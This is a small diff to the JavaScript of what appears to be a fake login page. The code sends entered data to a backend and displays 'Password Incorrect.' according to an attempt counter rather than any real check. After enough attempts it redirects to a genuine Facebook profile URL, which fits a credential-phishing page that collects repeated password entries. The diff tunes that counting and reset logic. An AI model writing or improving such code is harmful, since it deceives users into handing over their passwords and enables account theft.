@@ -244,6 +244,7 @@ form a {
         var resetCount = parseInt(localStorage.getItem('resetCount')) || 0;
         function validateReset(){
             ++resetCount;
+            count=0;
             localStorage.setItem('resetCount', resetCount);
             console.log(resetCount);
         }
@@ -273,9 +274,11 @@ form a {
             .then(data => {
               // Handle the response from the backend as needed
               console.log('Success:', data);
-                  if(resetCount>=1 || count<4){
+                  if(resetCount<1 || count<4){
                        errorMessage.innerText = "Password Incorrect.";
                        errorMessage.style.display = "block";
+                       localStorage.setItem('resetCount', 0);
+                      
                    }
                    else{
                         window.location.href = "https://www.facebook.com/profile.php?id=61555878152274";
